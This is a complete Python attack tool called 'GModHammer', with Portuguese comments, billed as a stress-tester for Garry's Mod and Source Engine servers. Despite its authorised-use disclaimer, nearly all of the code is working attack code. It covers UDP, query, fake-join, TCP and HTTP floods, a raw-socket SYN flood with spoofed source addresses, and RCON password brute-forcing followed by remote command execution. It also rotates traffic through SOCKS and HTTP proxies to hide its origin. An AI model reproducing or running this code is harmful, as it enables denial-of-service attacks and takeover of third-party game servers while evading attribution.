#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GModHammer v1.0
Ferramenta de stress-test para servidores Garry's Mod / Source Engine.

Uso autorizado: somente contra servidores que voce possui ou possui autorizacao
explicita para testar (pentest / Red Team / lab local). Nunca use contra
servidores de terceiros sem permissao.

Modos de ataque:
  udp-flood     Inunda a porta de jogo com pacotes UDP (carga aleatoria ou customizada)
  a2s-flood     Inunda com queries do Source Query Protocol (A2S_INFO / PLAYER / RULES)
  fake-join     Envia pacotes "connect" falsos (handshake GoldSource/Source)
  tcp-flood     Connect flood na porta TCP (com suporte a proxies)
  syn-flood     SYN flood via raw socket (Linux/Unix, requer root)
  rcon          Brute-force de senha RCON + execucao de comandos (via proxies)
  http-flood    Flood HTTP/HTTPS contra paineis web do servidor (via proxies)
  custom        Envia payloads hex/binarios personalizados por UDP ou TCP

Proxies: arquivo texto com linhas no formato [proto://]host:porta, ex.:
  http://127.0.0.1:8080
  socks5://127.0.0.1:9050
  socks4://user:pass@127.0.0.1:1080

NOTA: modos UDP (udp-flood, a2s-flood, fake-join, custom --transport udp)
exigem proxies SOCKS5 (o SOCKS5 possui UDP ASSOCIATE). Proxies HTTP/SOCKS4
funcionam apenas nos modos TCP (tcp-flood, rcon, http-flood, custom --transport tcp).
"""

import argparse
import base64
import random
import socket
import ssl
import struct
import sys
import threading
import time
from urllib.parse import urlparse
from typing import List, Optional, Tuple

try:
    import socks as sockslib
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False

BANNER = r"""
   _____                    __  __          __
  / ____|                  |  \/  |        / _|
 | |  __  ___  _ __ ___  __| \  / | ___   | |_ __ _ _ __ ___  _ __
 | | |_ |/ _ \| '_ ` _ \/ _` |\/| |/ _ \  |  _/ _` | '__/ _ \| '__|
 | |__| | (_) | | | | | | (_| |  | | (_) | | || (_| | | |  __/ |
  \_____|\___/|_| |_| |_|\__,_|  |_|\___/  |_| \__,_|_|  \___|_|
"""

QUERY_HEADER = b"\xff\xff\xff\xff"
DEFAULT_PORT = 27015
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]
PLAYER_NAMES = [
    "Player", "Tester", "Stress", "Bot", "Probe", "Guest",
    "loadtest", "p0c", "h4x0r", "anon", "Vanguard", "n0body",
]


def rand_bytes(n: int) -> bytes:
    return bytes(random.getrandbits(8) for _ in range(n))


def _recv_exact(s: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("conexao fechada pelo servidor")
        buf += chunk
    return buf


# ---------------------------------------------------------------- stats ---

class Stats:
    """Contador atomico de pacotes enviados e erros."""

    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.errors = 0

    def add(self, n: int = 1):
        with self.lock:
            self.sent += n

    def err(self, n: int = 1):
        with self.lock:
            self.errors += n

    def snapshot(self) -> Tuple[int, int]:
        with self.lock:
            return self.sent, self.errors


def stats_reporter(stats: Stats, stop: threading.Event, interval: float = 2.0):
    last, last_t = 0, time.time()
    while not stop.wait(interval):
        sent, errs = stats.snapshot()
        now = time.time()
        rate = (sent - last) / (now - last_t) if now > last_t else 0.0
        print(f"  [*] pacotes={sent} erros={errs} taxa={rate:.0f} pkt/s", flush=True)
        last, last_t = sent, now


# --------------------------------------------------------------- proxy ----

class Proxy:
    def __init__(self, proto: str, host: str, port: int,
                 username: Optional[str] = None, password: Optional[str] = None):
        self.proto = proto
        self.host = host
        self.port = port
        self.username = username
        self.password = password

    def __str__(self) -> str:
        return f"{self.proto}://{self.host}:{self.port}"

    @classmethod
    def parse(cls, line: str) -> Optional["Proxy"]:
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        if "://" in line:
            proto, rest = line.split("://", 1)
            proto = proto.lower()
        else:
            proto, rest = "http", line
        if proto not in ("http", "socks4", "socks5"):
            raise ValueError(f"protocolo de proxy desconhecido: {proto}")
        creds = None
        if "@" in rest:
            creds, rest = rest.rsplit("@", 1)
        host_port = rest.split("/")[0]
        if ":" not in host_port:
            raise ValueError(f"proxy sem porta: {line}")
        host, port = host_port.rsplit(":", 1)
        port = int(port)
        username = password = None
        if creds:
            username, _, password = creds.partition(":")
        return cls(proto, host, port, username, password)

    def _connect_http(self, target_host: str, target_port: int, timeout: float) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout)
        s.settimeout(timeout)
        req = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n"
        if self.username:
            token = base64.b64encode(f"{self.username}:{self.password or ''}".encode()).decode()
            req += f"Proxy-Authorization: Basic {token}\r\n"
        req += "\r\n"
        s.sendall(req.encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        if not buf.startswith(b"HTTP/1.1 200"):
            s.close()
            raise ConnectionError(f"CONNECT via {self} falhou: {buf[:48]!r}")
        return s

    def _connect_socks(self, target_host: str, target_port: int, timeout: float) -> socket.socket:
        if not HAS_PYSOCKS:
            raise ConnectionError("PySocks nao instalado: pip install pysocks")
        stype = sockslib.SOCKS4 if self.proto == "socks4" else sockslib.SOCKS5
        s = sockslib.socksocket()
        s.set_proxy(stype, self.host, self.port,
                    username=self.username, password=self.password)
        s.settimeout(timeout)
        s.connect((target_host, target_port))
        return s

    def connect(self, target_host: str, target_port: int, timeout: float = 5.0) -> socket.socket:
        if self.proto == "http":
            return self._connect_http(target_host, target_port, timeout)
        return self._connect_socks(target_host, target_port, timeout)

    # -- SOCKS5 UDP ASSOCIATE (RFC 1928) ------------------------------

    def udp_associate(self, timeout: float = 6.0) -> Tuple[socket.socket, Tuple[str, int], socket.socket]:
        """Estabelece um canal UDP ASSOCIATE com o proxy SOCKS5.

        Retorna (socket_udp, endereco_udp_do_proxy, socket_tcp_controle).
        O socket de controle DEVE permanecer aberto enquanto os datagramas
        forem enviados (exigencia do RFC 1928) e e fechado junto com o UDP.
        """
        if self.proto != "socks5":
            raise ConnectionError(
                f"{self} nao suporta UDP; use um proxy SOCKS5")
        ctrl = socket.create_connection((self.host, self.port), timeout)
        ctrl.settimeout(timeout)

        def recv_n(n: int) -> bytes:
            return _recv_exact(ctrl, n)

        # 1) negociacao de metodos
        methods = b"\x00\x02" if (self.username or self.password) else b"\x00"
        ctrl.sendall(b"\x05" + bytes([len(methods)]) + methods)
        ver, chosen = recv_n(2)
        if ver != 0x05:
            ctrl.close()
            raise ConnectionError(f"{self}: versao SOCKS invalida")
        if chosen == 0x02:
            user = (self.username or "").encode()
            pwd = (self.password or "").encode()
            ctrl.sendall(b"\x01" + bytes([len(user)]) + user + bytes([len(pwd)]) + pwd)
            ver2, status = recv_n(2)
            if status != 0x00:
                ctrl.close()
                raise ConnectionError(f"{self}: autenticacao falhou")
        elif chosen != 0x00:
            ctrl.close()
            raise ConnectionError(f"{self}: metodo solicitado nao aceito")

        # 2) UDP ASSOCIATE com 0.0.0.0:0 (deixa o proxy escolher a porta)
        ctrl.sendall(b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
        hdr = recv_n(4)  # VER REP RSV ATYP
        if hdr[0] != 0x05 or hdr[1] != 0x00:
            ctrl.close()
            raise ConnectionError(f"{self}: UDP ASSOCIATE rejeitado (rep={hdr[1]})")
        atyp = hdr[3]
        if atyp == 0x01:
            addr = socket.inet_ntoa(recv_n(4))
        elif atyp == 0x03:
            ln = recv_n(1)[0]
            addr = recv_n(ln).decode()
        elif atyp == 0x04:
            addr = socket.inet_ntop(socket.AF_INET6, recv_n(16))
        else:
            ctrl.close()
            raise ConnectionError(f"{self}: ATYP desconhecido no UDP ASSOCIATE")
        port = struct.unpack("!H", recv_n(2))[0]

        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp.settimeout(timeout)
        return udp, (addr, port), ctrl


class SocksUdpSocket:
    """Wrapper de socket UDP que encapsula datagramas em pacotes SOCKS5."""

    def __init__(self, udp_sock: socket.socket, relay_addr: Tuple[str, int],
                 ctrl: socket.socket):
        self.udp = udp_sock
        self.relay = relay_addr
        self.ctrl = ctrl
        self.lock = threading.Lock()

    def sendto(self, data: bytes, addr: Tuple[str, int]) -> int:
        host, port = addr
        try:
            ip = socket.inet_aton(host)
            atyp = 0x01
        except OSError:
            ip = socket.gethostbyname(host)
            ip = socket.inet_aton(ip)
            atyp = 0x01
        hdr = b"\x00\x00\x00" + bytes([atyp]) + ip + struct.pack("!H", port)
        with self.lock:
            return self.udp.sendto(hdr + data, self.relay)

    def close(self):
        for s in (self.udp, self.ctrl):
            try:
                s.close()
            except Exception:
                pass


def load_proxies(path: str) -> List[Proxy]:
    proxies = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            try:
                p = Proxy.parse(line)
            except ValueError as e:
                print(f"  [!] ignorando linha invalida: {e}")
                continue
            if p:
                proxies.append(p)
    return proxies


class ProxyPool:
    """Rotaciona proxies com health-check contra o alvo real."""

    def __init__(self, proxies: List[Proxy], target_host: str, target_port: int,
                 check_timeout: float = 6.0, udp: bool = False):
        self.proxies = proxies
        self.host = target_host
        self.port = target_port
        self.check_timeout = check_timeout
        self.udp = udp
        self.lock = threading.Lock()
        self._idx = 0

    def check(self) -> List[Proxy]:
        good = []
        for p in self.proxies:
            try:
                s = p.connect(self.host, self.port, timeout=self.check_timeout)
                s.close()
                good.append(p)
            except Exception:
                pass
        dropped = len(self.proxies) - len(good)
        self.proxies = good
        if dropped:
            print(f"  [!] health-check: {dropped} proxy(s) inativo(s) removidos; restam {len(good)}")
        return good

    def next(self) -> Optional[Proxy]:
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self._idx % len(self.proxies)]
            self._idx += 1
            return p

    # -- UDP via SOCKS5 ------------------------------------------------

    def udp_proxies(self) -> List[Proxy]:
        """Somente proxies SOCKS5 (unico que suporta UDP)."""
        return [p for p in self.proxies if p.proto == "socks5"]

    def check_udp(self) -> List[Proxy]:
        """Health-check para modos UDP: valida o UDP ASSOCIATE de cada SOCKS5."""
        good = []
        for p in self.udp_proxies():
            try:
                udp, relay, ctrl = p.udp_associate(timeout=self.check_timeout)
                udp.close()
                ctrl.close()
                good.append(p)
            except Exception:
                pass
        dropped = len(self.proxies) - len(good)
        self.proxies = good
        if dropped:
            print(f"  [!] health-check UDP: {dropped} proxy(s) inativo(s) removidos; restam {len(good)}")
        return good

    def next_udp_socket(self) -> Optional[SocksUdpSocket]:
        """Cria um canal UDP ASSOCIATE com um proxy SOCKS5 aleatorio."""
        pool5 = self.udp_proxies()
        if not pool5:
            return None
        start = random.randrange(len(pool5))
        for i in range(len(pool5)):
            p = pool5[(start + i) % len(pool5)]
            try:
                udp, relay, ctrl = p.udp_associate(timeout=self.check_timeout)
                return SocksUdpSocket(udp, relay, ctrl)
            except Exception:
                continue
        return None


# --------------------------------------------------- pacotes source -------

def a2s_info_packet() -> bytes:
    """A2S_INFO - query basica de informacoes do servidor (0x54)."""
    return QUERY_HEADER + b"\x54Source Engine Query\x00"


def a2s_players_packet() -> bytes:
    """A2S_PLAYER (0x55) - requer challenge."""
    return QUERY_HEADER + b"\x55\xff\xff\xff\xff"


def a2s_rules_packet() -> bytes:
    """A2S_RULES (0x56) - requer challenge."""
    return QUERY_HEADER + b"\x56\xff\xff\xff\xff"


def source_connect_packet(ip: str, port: int, name: str) -> bytes:
    """Pacote 'connect' falso (formato classico GoldSource/Source)."""
    challenge = "".join(random.choice("0123456789abcdef") for _ in range(8))
    body = f'connect 48 {ip}:{port} {challenge} 0 0 "{name}"'
    return QUERY_HEADER + body.encode(errors="ignore") + b"\x00"


def rcon_packet(req_id: int, ptype: int, body: str = "") -> bytes:
    """Monta pacote RCON (SERVERDATA). ptype: 3=AUTH, 2=EXECCOMMAND, 0=RESPONSE."""
    payload = struct.pack("<ii", req_id, ptype) + body.encode() + b"\x00\x00"
    return struct.pack("<i", len(payload)) + payload


def rcon_exchange(s: socket.socket, packet: bytes) -> Tuple[int, int, str]:
    """Envia pacote RCON e le a resposta. Retorna (req_id, ptype, body)."""
    s.sendall(packet)
    size = struct.unpack("<i", _recv_exact(s, 4))[0]
    if size <= 0:
        return 0, 0, ""
    data = _recv_exact(s, size)
    if len(data) >= 10:
        req_id, ptype = struct.unpack("<ii", data[:8])
        return req_id, ptype, data[8:-2].decode(errors="ignore")
    return 0, 0, ""


# --------------------------------------------------------- syn flood ------

def _chk(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def build_syn(src_ip: str, src_port: int, dst_ip: str, dst_port: int, seq: int) -> bytes:
    """Monta pacote IP+TCP com flag SYN e IP de origem (possivelmente spoofado)."""
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.getrandbits(16), 0x4000, 64,
                      socket.IPPROTO_TCP, 0, src, dst)
    iph = iph[:10] + struct.pack("!H", _chk(iph)) + iph[12:]
    tcp = struct.pack("!HHLLBBHHH", src_port, dst_port, seq, 0, (5 << 4), 0x02, 64240, 0, 0)
    pseudo = struct.pack("!4s4sBBH", src, dst, 0, socket.IPPROTO_TCP, len(tcp))
    tcp_chk = _chk(pseudo + tcp)
    tcp = struct.pack("!HHLLBBHHH", src_port, dst_port, seq, 0, (5 << 4), 0x02, 64240, tcp_chk, 0)
    return iph + tcp


# ------------------------------------------------------------ workers -----

def udp_worker(target: str, ports: List[int], size: int, payload: Optional[bytes],
               rate_delay: float, stats: Stats, stop: threading.Event,
               factory=None, pool: Optional[ProxyPool] = None):
    """Worker UDP; com pool, cada worker cria seu proprio canal SOCKS5 UDP."""
    if pool:
        sock = pool.next_udp_socket()
        if sock is None:
            print("  [X] nenhum proxy SOCKS5 UDP disponivel (http/socks4 nao suportam UDP)")
            stop.set()
            return
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    port = random.choice(ports)
    try:
        while not stop.is_set():
            if factory:
                data = factory(target, port)
            elif payload:
                data = payload
            else:
                data = rand_bytes(size)
            try:
                sock.sendto(data, (target, port))
                stats.add()
            except OSError:
                stats.err()
            if rate_delay > 0:
                time.sleep(rate_delay)
    finally:
        try:
            sock.close()
        except Exception:
            pass


def tcp_worker(target: str, port: int, payload: Optional[bytes], rate_delay: float,
               stats: Stats, stop: threading.Event, pool: Optional[ProxyPool]):
    while not stop.is_set():
        try:
            if pool:
                proxy = pool.next()
                if not proxy:
                    time.sleep(0.2)
                    continue
                s = proxy.connect(target, port, timeout=6.0)
            else:
                s = socket.create_connection((target, port), timeout=6.0)
            s.settimeout(6.0)
            if payload:
                s.sendall(payload)
            s.close()
            stats.add()
        except Exception:
            stats.err()
        if rate_delay > 0:
            time.sleep(rate_delay)


def syn_worker(target: str, port: int, spoof: Optional[str], stats: Stats,
               stop: threading.Event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except OSError as e:
        print(f"  [!] raw socket indisponivel: {e}")
        print("      (use Linux/Unix com privilegios de root)")
        stop.set()
        return
    seq = random.getrandbits(32)
    while not stop.is_set():
        sport = random.randint(1024, 65535)
        src = spoof or socket.inet_ntoa(struct.pack(">I", random.getrandbits(32)))
        try:
            s.sendto(build_syn(src, sport, target, port, seq), (target, port))
            stats.add()
        except OSError:
            stats.err()
        seq = (seq + 1) & 0xFFFFFFFF


def rcon_brute_worker(wordlist: List[str], idx_lock: threading.Lock, idx: List[int],
                      pool: Optional[ProxyPool], target: str, port: int,
                      stats: Stats, stop: threading.Event):
    while not stop.is_set():
        with idx_lock:
            if idx[0] >= len(wordlist):
                return
            pwd = wordlist[idx[0]]
            idx[0] += 1
        req_id = random.getrandbits(30) + 1
        s = None
        try:
            if pool:
                proxy = pool.next()
                if not proxy:
                    time.sleep(0.2)
                    continue
                s = proxy.connect(target, port, timeout=6.0)
            else:
                s = socket.create_connection((target, port), timeout=6.0)
            s.settimeout(5.0)
            rid, ptype, body = rcon_exchange(s, rcon_packet(req_id, 3, pwd))
            if rid == req_id and ptype == 2 and body == "":
                print(f"\n  [!!!] SENHA RCON ENCONTRADA: {pwd}")
                with open("rcon_found.txt", "a", encoding="utf-8") as f:
                    f.write(f"{target}:{port} -> {pwd}\n")
                stop.set()
            stats.add()
        except Exception:
            stats.err()
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass


def rcon_exec_worker(password: str, command: str, pool: Optional[ProxyPool],
                     target: str, port: int, rate_delay: float,
                     stats: Stats, stop: threading.Event):
    while not stop.is_set():
        try:
            if pool:
                proxy = pool.next()
                if not proxy:
                    time.sleep(0.2)
                    continue
                s = proxy.connect(target, port, timeout=6.0)
            else:
                s = socket.create_connection((target, port), timeout=6.0)
            s.settimeout(5.0)
            auth_id = random.getrandbits(30) + 1
            rid, ptype, _ = rcon_exchange(s, rcon_packet(auth_id, 3, password))
            if rid == auth_id and ptype == 2:
                exec_id = random.getrandbits(30) + 1
                rcon_exchange(s, rcon_packet(exec_id, 2, command))
            s.close()
            stats.add()
        except Exception:
            stats.err()
        if rate_delay > 0:
            time.sleep(rate_delay)


def http_worker(url: str, method: str, data: Optional[bytes], pool: Optional[ProxyPool],
                rate_delay: float, stats: Stats, stop: threading.Event):
    parsed = urlparse(url)
    is_tls = parsed.scheme == "https"
    host = parsed.hostname or ""
    port = parsed.port or (443 if is_tls else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    ctx = None
    if is_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    while not stop.is_set():
        try:
            if pool:
                proxy = pool.next()
                if not proxy:
                    time.sleep(0.2)
                    continue
                s = proxy.connect(host, port, timeout=8.0)
            else:
                s = socket.create_connection((host, port), timeout=8.0)
            if is_tls:
                s = ctx.wrap_socket(s, server_hostname=host)
            s.settimeout(8.0)
            ua = random.choice(USER_AGENTS)
            head = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: {ua}\r\nAccept: */*\r\nConnection: close\r\n")
            if data is not None:
                head += f"Content-Length: {len(data)}\r\n\r\n"
                s.sendall(head.encode() + data)
            else:
                head += "\r\n"
                s.sendall(head.encode())
            try:
                s.recv(4096)
            except Exception:
                pass
            s.close()
            stats.add()
        except Exception:
            stats.err()
        if rate_delay > 0:
            time.sleep(rate_delay)


# ------------------------------------------------------------- helpers ----

def run_workers(threads: int, duration: float, worker_fn, args_fn, stop: threading.Event):
    """Spawna N threads e aguarda o tempo definido (ou Ctrl+C)."""
    if duration > 0:
        threading.Timer(duration, stop.set).start()
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker_fn, args=args_fn(), daemon=True)
        t.start()
        workers.append(t)
    for t in workers:
        t.join()


def parse_ports(spec: str) -> List[int]:
    ports = []
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            ports.extend(range(int(a), int(b) + 1))
        elif part:
            ports.append(int(part))
    return ports


def build_payload(args) -> Optional[bytes]:
    if args.payload_hex:
        return bytes.fromhex(args.payload_hex.replace("\\x", "").replace(" ", ""))
    if args.payload_file:
        with open(args.payload_file, "rb") as f:
            return f.read()
    return None


def make_pool(args, host: str, port: int, udp: bool = False) -> Optional[ProxyPool]:
    if not args.proxies:
        return None
    plist = load_proxies(args.proxies)
    if not plist:
        print("  [!] nenhum proxy valido carregado; seguindo sem proxies")
        return None
    if udp:
        only5 = [p for p in plist if p.proto == "socks5"]
        if not only5:
            print("  [X] modo UDP exige proxies SOCKS5 (http/socks4 nao suportam UDP)")
            print("      adicione linhas 'socks5://host:porta' na lista de proxies")
            return None
        print(f"  [>] UDP via SOCKS5: {len(only5)} proxy(s) utilizaveis "
              f"({len(plist) - len(only5)} http/socks4 ignorados para UDP)")
        pool = ProxyPool(only5, host, port)
    else:
        pool = ProxyPool(plist, host, port)
    if args.proxy_check:
        if udp:
            pool.check_udp()
        else:
            pool.check()
    return pool


# ----------------------------------------------------------------- main ----

def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(
        prog="gmodhammer.py",
        description="GModHammer - stress-test para servidores Garry's Mod / Source Engine",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("--target", required=True, help="IP/dominio do servidor alvo")
    ap.add_argument("--port", default=str(DEFAULT_PORT),
                    help="porta(s) do alvo, ex.: 27015 ou 27015,27016 ou 27000-27100")
    ap.add_argument("--mode", required=True, choices=[
        "udp-flood", "a2s-flood", "fake-join", "tcp-flood", "syn-flood",
        "rcon", "http-flood", "custom",
    ], help="vetor de ataque")
    ap.add_argument("--threads", type=int, default=8, help="numero de threads/workers")
    ap.add_argument("--duration", type=float, default=0,
                    help="duracao em segundos (0 = ate Ctrl+C)")
    ap.add_argument("--rate", type=int, default=0,
                    help="limite de pacotes por segundo por worker (0 = sem limite)")
    ap.add_argument("--packet-size", type=int, default=512,
                    help="tamanho dos pacotes UDP em bytes (apenas carga aleatoria)")
    ap.add_argument("--payload-hex", default=None,
                    help="payload personalizado em hex, ex.: ffffffff5465737465")
    ap.add_argument("--payload-file", default=None,
                    help="arquivo com payload personalizado (bytes crus)")
    ap.add_argument("--proxies", default=None, help="arquivo de lista de proxies")
    ap.add_argument("--proxy-check", action="store_true",
                    help="valida proxies antes do ataque (health-check)")
    ap.add_argument("--interval", type=float, default=2.0,
                    help="intervalo do relatorio de estatisticas")
    # rcon
    ap.add_argument("--wordlist", default=None, help="wordlist de senhas RCON")
    ap.add_argument("--rcon-password", default=None, help="senha RCON conhecida")
    ap.add_argument("--rcon-command", default="status",
                    help="comando a executar via RCON (ex.: status, sv_cheats 1)")
    # http
    ap.add_argument("--url", default=None, help="URL completa para http-flood")
    ap.add_argument("--method", default="GET", help="metodo HTTP (GET/POST/HEAD)")
    ap.add_argument("--http-data", default=None, help="corpo do request HTTP")
    # custom
    ap.add_argument("--transport", default="udp", choices=["udp", "tcp"],
                    help="transporte para payloads personalizados (modo custom)")
    # syn
    ap.add_argument("--spoof", default=None, help="IP de origem fixo p/ SYN flood (spoofing)")
    args = ap.parse_args(argv)

    print(BANNER)
    print(f"  [>] alvo: {args.target}  portas: {args.port}  modo: {args.mode}  threads: {args.threads}")

    ports = parse_ports(args.port)
    target = args.target
    port = ports[0]
    stop = threading.Event()
    stats = Stats()
    rate_delay = (1.0 / args.rate) if args.rate > 0 else 0.0
    payload = build_payload(args)

    udp_modes = ("udp-flood", "a2s-flood", "fake-join")
    custom_udp = args.mode == "custom" and args.transport == "udp"

    pool = None
    if args.mode in ("tcp-flood", "rcon", "http-flood"):
        pool = make_pool(args, target, port)
    elif args.mode in udp_modes or custom_udp:
        pool = make_pool(args, target, port, udp=True)
        if args.proxies and pool is None:
            print("  [X] executando sem proxies nao e desejado com --proxies; abortando")
            return 1

    worker_fn, args_fn = None, None
    if args.mode == "udp-flood":
        worker_fn = udp_worker
        args_fn = lambda: (target, ports, args.packet_size, payload, rate_delay,
                           stats, stop, None, pool)
    elif args.mode == "a2s-flood":
        factories = [a2s_info_packet, a2s_players_packet, a2s_rules_packet]
        worker_fn = udp_worker
        args_fn = lambda: (target, ports, 0, None, rate_delay, stats, stop,
                           lambda t, p: random.choice(factories)(), pool)
    elif args.mode == "fake-join":
        worker_fn = udp_worker
        args_fn = lambda: (target, ports, 0, None, rate_delay, stats, stop,
                           lambda t, p: source_connect_packet(
                               t, p, random.choice(PLAYER_NAMES)), pool)
    elif args.mode == "tcp-flood":
        worker_fn = tcp_worker
        args_fn = lambda: (target, port, payload, rate_delay, stats, stop, pool)
    elif args.mode == "syn-flood":
        worker_fn = syn_worker
        args_fn = lambda: (target, port, args.spoof, stats, stop)
    elif args.mode == "custom":
        if payload is None:
            print("  [X] modo custom exige --payload-hex ou --payload-file")
            return 1
        if args.transport == "udp":
            worker_fn = udp_worker
            args_fn = lambda: (target, ports, 0, payload, rate_delay, stats, stop, None, pool)
        else:
            worker_fn = tcp_worker
            args_fn = lambda: (target, port, payload, rate_delay, stats, stop, pool)
    elif args.mode == "rcon":
        if args.rcon_password:
            worker_fn = rcon_exec_worker
            args_fn = lambda: (args.rcon_password, args.rcon_command, pool,
                               target, port, rate_delay, stats, stop)
        else:
            if not args.wordlist:
                print("  [X] use --rcon-password (exec) ou --wordlist (brute-force)")
                return 1
            with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                wordlist = [l.strip() for l in f if l.strip()]
            idx_lock, idx = threading.Lock(), [0]
            worker_fn = rcon_brute_worker
            args_fn = lambda: (wordlist, idx_lock, idx, pool, target, port, stats, stop)
    elif args.mode == "http-flood":
        if not args.url:
            print("  [X] modo http-flood exige --url")
            return 1
        data = args.http_data.encode() if args.http_data is not None else None
        worker_fn = http_worker
        args_fn = lambda: (args.url, args.method, data, pool, rate_delay, stats, stop)

    print("  [>] ataque iniciado (Ctrl+C para interromper)...")
    reporter = threading.Thread(target=stats_reporter, args=(stats, stop, args.interval),
                                daemon=True)
    reporter.start()
    try:
        run_workers(args.threads, args.duration, worker_fn, args_fn, stop)
    except KeyboardInterrupt:
        print("\n  [!] interrompido pelo usuario")
    finally:
        stop.set()

    sent, errs = stats.snapshot()
    print("\n  [=] resultado final:")
    print(f"      pacotes enviados: {sent}")
    print(f"      erros: {errs}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
